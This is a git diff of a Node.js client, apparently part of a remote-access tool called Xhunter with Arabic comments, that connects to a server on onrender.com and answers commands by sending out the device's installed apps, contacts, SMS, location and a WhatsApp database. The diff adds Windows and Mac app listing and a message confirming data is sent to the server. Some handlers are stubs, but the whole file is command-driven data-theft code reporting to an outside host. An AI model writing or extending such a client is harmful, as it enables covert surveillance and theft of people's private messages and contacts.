@@ -1,9 +1,9 @@
 const io = require('socket.io-client');
-const socket = io('https://xhunter-nd49.onrender.com'); // ضع هنا رابط السيرفر على Render
-
 const os = require('os');
 const fs = require('fs');
 const path = require('path');
+
+const socket = io('https://xhunter-nd49.onrender.com'); // رابط السيرفر على Render
 
 const deviceId = 'device_' + Math.floor(Math.random()*10000);
 const model = os.type() + ' ' + os.arch();
@@ -14,15 +14,17 @@ function sendResult(action, data){
   socket.emit(action, { id: deviceId, action, data });
 }
 
-// الأوامر الحقيقية
+// أوامر العميل
 socket.on('getInstalledApps', () => {
-  // مثال على التطبيقات المثبتة على جهازك (Node.js يمكنه الوصول للملفات)
-  const apps = fs.readdirSync('/Applications'); // في نظام Mac، أو مسار برامج Windows
+  let apps = [];
+  try {
+    if (fs.existsSync('C:/Program Files')) apps = fs.readdirSync('C:/Program Files');
+    else if (fs.existsSync('/Applications')) apps = fs.readdirSync('/Applications');
+  } catch(e){ apps = ['خطأ في الوصول إلى التطبيقات']; }
   sendResult('getInstalledApps', apps);
 });
 
 socket.on('getContacts', () => {
-  // يمكنك ربطها بملفات محلية لديك أو قاعدة بيانات
   const contacts = fs.existsSync('contacts.json') ? JSON.parse(fs.readFileSync('contacts.json')) : [];
   sendResult('getContacts', contacts);
 });
@@ -38,7 +40,6 @@ socket.on('getSMS', () => {
 });
 
 socket.on('getLocation', () => {
-  // Node.js لا يستطيع الموقع الجغرافي بدون GPS محلي، يمكن ربط API أو GPS جهازك
   sendResult('getLocation', { lat: 0, lon: 0 });
 });
 
@@ -49,3 +50,5 @@ socket.on('downloadWhatsappDatabase', () => {
     sendResult('downloadWhatsappDatabase', data);
   } else sendResult('downloadWhatsappDatabase', 'ملف غير موجود');
 });
+
+console.log("عميل Xhunter جاهز ويرسل البيانات للسيرفر على Render.");
